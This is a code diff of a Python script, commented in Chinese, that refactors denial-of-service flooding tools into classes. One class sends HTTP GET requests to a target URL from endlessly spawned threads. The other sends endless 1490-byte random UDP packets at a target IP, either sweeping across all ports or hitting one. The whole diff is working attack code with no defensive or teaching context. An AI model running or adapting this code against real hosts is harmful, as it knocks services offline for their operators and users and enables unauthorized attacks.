@@ -21,50 +21,61 @@ def getip(name):
 
 
 # 洪水攻击
-def startattack(url, speed, headers=headers):
-    def attack(speed, collector = {}):
-        for i in range(speed):
+class attack:
+    def attack(self):
+        for i in range(self.speed):
             try:
-                r = requests.get(url, headers)
-                collector['success'] += 1
+                r = requests.get(self.url, self.headers)
+                self.collector['success'] += 1
             except:
                 # 发送失败
-                collector['err'] += speed - i
+                self.collector['err'] += self.speed - i
                 break
-    collector = {
-        "success": 0,
-        "err": 0,
-    }
-    while True:
-        t1 = threading.Thread(target=attack, args=(speed, collector))
-        t1.start()
-        print("\r已发送{}个包，失效{}个包".format(
-            collector['success'] + collector['err'],
-            collector['err']
-        ), end="")
+    def startattack(self):
+        while True:
+            t = threading.Thread(target=self.attack, args=())
+            t.start()
+    def __init__(self, url, speed, headers=headers):
+        self.url = url
+        self.speed = speed
+        self.headers = headers
+        self.collector = {
+            "success": 0,
+            "err": 0,
+        }
 
-# 泛洪攻击
-def ddos_attack(ip, port = 1):
-    sent = 0
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(1490)
-    while True:
-        sock.sendto(bytes, (ip,port))
-        sent = sent + 1
-        port = port + 1
-        print ("已发送 %s 个包到 %s 通过端口:%s"%(sent,ip,port))
-        if port == 65534:
-            port = 1
-# 洪攻击
-def c_ddos_attack(ip,port = 1):
-    sent = 0
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(1490)
-    
-    while True:
-        sock.sendto(bytes, (ip,port))
-        sent = sent + 1
-        print ("已发送 %s 个包到 %s 通过端口:%s"%(sent,ip,port))
+
+class ddos:
+    # 泛洪攻击
+    def all(self):
+        self.data['port'] = self.port
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1490)
+        while True:
+            sock.sendto(bytes, (self.ip,self.data['port']))
+            self.data['sent'] += 1
+            self.data['port'] += 1
+            if self.data['port'] == 65534:
+                self.data['port'] = 1
+    # 洪攻击
+    def one(self):
+        self.rport = self.port
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1490)
+        
+        while True:
+            sock.sendto(bytes, (self.ip,self.port))
+            self.data['sent'] += 1
+    def __init__(self, ip, port = 1):
+        self.sent = 0
+        self.ip = ip
+        self.port = port
+        self.data = {
+            "sent": 0,
+            "port": 0,
+        }
+
+
 
 if __name__ == "__main__":
     print(ping('8.8.8.8'))
